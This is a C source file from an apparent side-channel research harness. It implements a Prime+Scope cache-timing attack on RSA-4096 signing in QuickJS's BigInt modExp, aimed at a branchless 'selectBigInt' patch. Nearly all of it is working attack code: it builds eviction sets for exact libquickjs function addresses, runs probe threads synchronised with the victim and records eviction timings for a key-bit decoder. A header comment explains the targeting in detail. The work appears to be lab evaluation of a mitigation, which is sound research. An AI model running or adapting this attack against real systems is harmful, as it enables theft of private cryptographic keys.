/* Prime+Scope attacker against the branchless `selectBigInt` patch inside a
 * real RSA-4096 BigInteger.modExp loop. Same victim as quickjs_select_rsa_fr.c;
 * only the measurement primitive and the target line differ.
 *
 * WHY P+S HERE (see openpgp_patch_rsa/PROGRESS.md for the full trail):
 * the FR attacker's probe period bottoms out at ~1778 cycles, because each
 * probe only detects an access landing between its flush and its reload, so
 * shrinking FR_wait trades sensitivity away for resolution roughly 1:1 (a
 * sweep over WAITING_TIME=2000..100 raised the sample rate ~2x while dropping
 * observed hits ~3x). Against a ~280,000-cycle modExp iteration that yields
 * only ~1.9-3.0 hits per SELECT call -- the entire dynamic range available to
 * classify a bit.
 *
 * PS_profile_once (src/attack/prime_probe.c) is *event-driven* rather than
 * sampled: it spins on a single timed access to the scope line and records a
 * (tsc, latency) pair only when an eviction actually occurs, re-priming after
 * each. Its loop period is one timed access rather than FR's flush+wait+reload,
 * so it resolves individual accesses within a single SELECT call instead of
 * quantizing the whole call to ~2 samples.
 *
 * WHAT THE PROBED LINES ACTUALLY CONTAIN. bf_logic_or, bf_logic_xor and
 * bf_logic_and are three 16-byte thunks that all tail-jump into bf_logic_op,
 * and bf_rint sits immediately before them. In the current build they land as:
 *
 *   0xb1210 bf_rint      \
 *   0xb1220 bf_logic_or   >  one 64-byte line, base 0xb1200   <- OR/RINT probe
 *   0xb1230 bf_logic_xor /
 *   0xb1240 bf_logic_and     the next line, base 0xb1240      <- AND probe
 *
 * So the line named "bf_logic_or" is NOT exclusive to SELECT's `|`: bf_rint is
 * on it too, and bf_rint is hot -- bf_divrem/bf_rem call it, so every `%` in
 * the modExp loop touches this line. Interposing the PLT over one RSA-4096
 * signature of the SELECT-patched victim counts, per signing:
 *
 *   bf_logic_or   4094   (1 per modExp iteration: SELECT's `|`)
 *   bf_logic_and 12282   (3 per iteration: `exp & 1n` plus SELECT's two `&`)
 *   bf_logic_xor     0
 *   bf_rint      13305   (~3.25 per iteration, from the `%` operations)
 *
 * bf_rint + bf_logic_or = 17399, and that is what the ~17,000-record traces in
 * data/traces are -- not bf_logic_or alone (4094), and not bf_logic_and
 * (12282). bf_logic_and also cannot be bleeding into that trace: its line
 * differs in address bit 6, which is part of the LLC set index, so it is a
 * different set and the eviction set built for the OR/RINT line never covers
 * it.
 *
 * Both lines are therefore probed. Slot 1 is the OR/RINT line, i.e. the signal
 * the shipped traces and analysis/decoder.py already use (the decoder reads the
 * *last* column, so keeping it last leaves the decoder unchanged). Slot 0 is
 * bf_logic_and, which SELECT calls twice per iteration; a run with both lines
 * shows directly which line carries the bit-dependent gap.
 *
 * The tradeoff of P+S is that it is *set*-granular where FR is line-granular,
 * so anything else mapping to the same LLC set is counted too.
 *
 * Unlike quickjs_rsa.c/quickjs_rsa_key_pool.c, this does NOT need
 * identify_quickjs_target_sets: those profile every L3 set because the
 * bytecode-handler line's address is uncertain. Here the targets are exact
 * addresses taken from the linker (ASLR is disabled by setup.sh, so victim and
 * attacker map libquickjs.so identically), so prepare_evset() can build an
 * eviction set for a known address directly.
 */
#include "arch.h"
#include "cache.h"
#include "cache/cache_param.h"
#include "cache/helper_thread.h"
#include "config.h"
#include "log.h"
#include "prime_probe.h"
#include "quickjs_runtime.h"
#include "quickjs/libbf.h"
#include "quickjs/quickjs-libc.h"
#include "shared_memory.h"

#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

/* Buffers are sized for both lines; `probe_count` below selects how many are
 * actually probed in a run. Slot 0 is special: it is the thread that runs the
 * victim's START/PAUSE handshake and dumps the traces (see PS_profile_once and
 * PS_attacker_thread in src/attack/prime_probe.c). */
enum { cache_line_count = 2, profile_iterations = 1 << 20 };

/* PROBE_LINE selects which line(s) to probe: "or" (default, the OR/RINT line
 * the shipped traces and REPORT numbers come from), "and" (the bf_logic_and
 * line SELECT calls twice per iteration), or "both".
 *
 * "both" is NOT the default: the two P+S threads contend, and a measured
 * two-probe run has one slot starving the other per round -- r0 recorded
 * 12,246 OR/RINT events against 667 AND events, r1 recorded 342 against 9,690.
 * Each line is clean on its own (single-probe OR/RINT traces hold ~17,000
 * records, 99% of the 17,399 bf_rint+bf_logic_or calls one signature makes),
 * so compare the two lines across two single-probe runs, not within one run. */
static int probe_count = 1;
static int probe_and_only = 0;

static uint64_t victim_runs = 5;
static uint64_t key_id = 0;
/* One RSA-4096 sign is ~900ms (~2.2e9 cycles at the 2.4GHz setup.sh pins);
 * 4e9 leaves margin. P+S records only eviction events, so over-running the
 * budget costs wall time but adds no trace noise -- unlike the FR attacker,
 * which needed an early SYNC_CTX_PAUSE break to avoid diluting its sampled
 * trace with post-signing idle. */
static uint64_t max_exec_cycles = (uint64_t)4e9;
static const char *test_name = "quickjs_select_rsa_ps";

static uint64_t probe_time_arr[cache_line_count][profile_iterations];
static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *probe_time[cache_line_count];

static PS_attacker_thread_config_t pt_bf_logic_and;
static PS_attacker_thread_config_t pt_bf_logic_or;
static pthread_barrier_t attacker_threads_barrier;

/* Taken from the linker, not hard-coded file offsets: bf_logic_or/bf_logic_and
 * are exported by libquickjs.so (declared in libbf.h), so &bf_logic_or is the
 * loaded address in the same mapping the victim executes from. Nothing here
 * needs recomputing when the QuickJS build changes -- but the *co-residency*
 * documented at the top of this file does, since it depends on where the linker
 * placed bf_rint relative to the logic thunks. */
static uintptr_t target_bf_logic_and;
static uintptr_t target_bf_logic_or;

static void get_select_targets(void) {
	target_bf_logic_and = (uintptr_t)&bf_logic_and & CACHE_LINE_MASK;
	target_bf_logic_or = (uintptr_t)&bf_logic_or & CACHE_LINE_MASK;

	log_info("bf_logic_and %p -> line %lx; bf_logic_or %p -> line %lx; "
	         "bf_rint %p (line %lx)",
	         (void *)&bf_logic_and,
	         target_bf_logic_and,
	         (void *)&bf_logic_or,
	         target_bf_logic_or,
	         (void *)&bf_rint,
	         (uintptr_t)&bf_rint & CACHE_LINE_MASK);

	if ((((uintptr_t)&bf_rint) & CACHE_LINE_MASK) != target_bf_logic_or)
		log_info("note: bf_rint is NOT on the bf_logic_or line in this build; "
		         "the record counts quoted at the top of this file no longer "
		         "apply");
	if (target_bf_logic_and == target_bf_logic_or)
		log_error("bf_logic_and and bf_logic_or share a cache line in this "
		          "build -- the two probes are not separable");
}

/* Build eviction sets for both known target addresses. Returns 1 on success. */
static int build_select_evsets(void) {
	helper_thread_ctrl hctrl;
	if (start_helper_thread(&hctrl)) {
		log_error("Failed to start helper thread");
		return 0;
	}

	static const int retry = 4;
	/* Ordered so that index 0 is always the line the single-probe run uses. */
	uint8_t *targets[cache_line_count] = {
		(uint8_t *)(probe_and_only ? target_bf_logic_and : target_bf_logic_or),
		(uint8_t *)(probe_and_only ? target_bf_logic_or : target_bf_logic_and),
	};
	EVSet **evsets[cache_line_count] = {
		probe_and_only ? &pt_bf_logic_and.evset : &pt_bf_logic_or.evset,
		probe_and_only ? &pt_bf_logic_or.evset : &pt_bf_logic_and.evset
	};
	const char *labels[cache_line_count] = {
		probe_and_only ? "bf_logic_and" : "bf_logic_or",
		probe_and_only ? "bf_logic_or" : "bf_logic_and"
	};

	for (int i = 0; i < probe_count; ++i) {
		for (int r = 0; r < retry && *evsets[i] == NULL; ++r) {
			*evsets[i] = prepare_evset(targets[i], &hctrl);
		}
		if (*evsets[i] == NULL) {
			log_error("Failed to build evset for %s", labels[i]);
			stop_helper_thread(&hctrl);
			return 0;
		}
		log_info("Built evset for %s: %p", labels[i], (void *)*evsets[i]);
	}

	stop_helper_thread(&hctrl);
	return 1;
}

static void profile_select_rsa(void) {
	pthread_t thread0 = 0, thread1 = 0;
	char test_key_name[256];
	int err;

	if (pthread_barrier_init(&attacker_threads_barrier, NULL, probe_count) !=
	    0) {
		log_error("Error initializing attacker thread barrier");
		return;
	}

	/* key-pool-style naming, matching quickjs_select_rsa_fr.c so the same
	 * evaluation scripts can point at either attack's output. */
	snprintf(test_key_name,
	         sizeof(test_key_name),
	         "%s/%s_key%05lu",
	         test_name,
	         test_name,
	         (unsigned long)key_id);
	pt_bf_logic_and.test_name = test_key_name;
	pt_bf_logic_or.test_name = test_key_name;

	/* quickjs_eval_buf_loop passes sync_ctx.data through putenv(), matching
	 * openpgp_select_rsa.js's KEY_ID mechanism. */
	snprintf((char *)sync_ctx.data,
	         sync_ctx_data_size,
	         "KEY_ID=%lu",
	         (unsigned long)key_id);

	/* matches the victim's (A) init barrier; PS_profile_once handles the
	 * per-round START/PAUSE handshake internally for slot 0. */
	log_info("Prime+Scope waiting for victim warm-up");
	pthread_barrier_wait(sync_ctx.barrier);
	log_info("Prime+Scope warm-up done");

	PS_attacker_thread_config_t *first =
	    probe_and_only ? &pt_bf_logic_and : &pt_bf_logic_or;
	err = pthread_create(&thread0, NULL, PS_attacker_thread, first);
	if (err != 0)
		log_error("can't create %s thread :[%s]", first->label, strerror(err));

	if (probe_count > 1) {
		err = pthread_create(
		    &thread1, NULL, PS_attacker_thread, &pt_bf_logic_and);
		if (err != 0)
			log_error("can't create bf_logic_and thread :[%s]", strerror(err));
	}

	pthread_join(thread0, NULL);
	if (thread1 != 0)
		pthread_join(thread1, NULL);

	pthread_barrier_destroy(&attacker_threads_barrier);

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);
}

static void parse_env_u64(const char *name, uint64_t *out) {
	const char *v = getenv(name);
	if (v == NULL)
		return;
	char *endptr;
	errno = 0;
	uint64_t value = strtoull(v, &endptr, 10);
	if (errno == 0 && endptr != v && *endptr == '\0')
		*out = value;
}

int main(int argc, char **argv) {
	get_config();
	init_sync_ctx(QUICKJS_PROJ_ID);
	quickjs_get_bytecode_handler_cacheline();
	get_select_targets();

	srand(time(NULL));

	parse_env_u64("VICTIM_RUNS", &victim_runs);
	parse_env_u64("KEY_ID", &key_id);
	parse_env_u64("ROUND_CYCLES", &max_exec_cycles);

	const char *probe_line = getenv("PROBE_LINE");
	if (probe_line == NULL || strcmp(probe_line, "or") == 0) {
		probe_count = 1;
	} else if (strcmp(probe_line, "and") == 0) {
		probe_count = 1;
		probe_and_only = 1;
	} else if (strcmp(probe_line, "both") == 0) {
		probe_count = 2;
	} else {
		log_error("Invalid PROBE_LINE '%s' (expected or|and|both)", probe_line);
		return -1;
	}

	if (argc > 1) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(argv[1], &endptr, 10);
		if (errno == 0 && endptr != argv[1] && *endptr == '\0' && value > 0) {
			victim_runs = value;
		} else {
			log_error("Invalid victim_runs argument '%s'", argv[1]);
			return -1;
		}
	}

	log_info("Config: victim_runs=%lu, key_id=%lu, max_exec_cycles=%lu, "
	         "probe_count=%d (%s)",
	         (unsigned long)victim_runs,
	         (unsigned long)key_id,
	         (unsigned long)max_exec_cycles,
	         probe_count,
	         probe_count > 1 ? "bf_logic_or + bf_logic_and"
	                         : (probe_and_only ? "bf_logic_and only"
	                                           : "bf_logic_or only"));

	if (cache_env_init(1)) {
		log_error("Failed to initialize cache env!");
		return 1;
	}

	for (int i = 0; i < cache_line_count; ++i) {
		sample_tsc[i] = sample_tsc_arr[i];
		probe_time[i] = probe_time_arr[i];
	}

	/* The OR/RINT line owns slot 0: slot 0 drives the victim handshake, and in
	 * the default single-probe run it is the only probe. Note the column
	 * convention this breaks with -- analysis/decoder.py reads the *last*
	 * column, which is correct for a one-column trace but picks the AND column
	 * when PROBE_AND=1, so pass the slot explicitly there (load_trace(slot=0))
	 * when decoding a two-probe trace as the OR/RINT signal. */
	PS_thread_config_init(pt_bf_logic_or);
	pt_bf_logic_or.label = "bf_logic_or";
	pt_bf_logic_or.slot = probe_and_only ? 1 : 0;
	pt_bf_logic_or.pin_cpu = -1;
	pt_bf_logic_or.target = (uint8_t *)target_bf_logic_or;
	pt_bf_logic_or.cache_line_count = probe_count;

	PS_thread_config_init(pt_bf_logic_and);
	pt_bf_logic_and.label = "bf_logic_and";
	pt_bf_logic_and.slot = probe_and_only ? 0 : 1;
	pt_bf_logic_and.pin_cpu = -1;
	pt_bf_logic_and.target = (uint8_t *)target_bf_logic_and;
	pt_bf_logic_and.cache_line_count = probe_count;

	if (!build_select_evsets()) {
		log_error("Could not build evsets for the bf_logic lines");
		/* Release the victim rather than leaving it parked on its barrier. */
		sync_ctx_set_action(SYNC_CTX_EXIT);
		pthread_barrier_wait(sync_ctx.barrier);
		return -1;
	}

	profile_select_rsa();
	return 0;
}
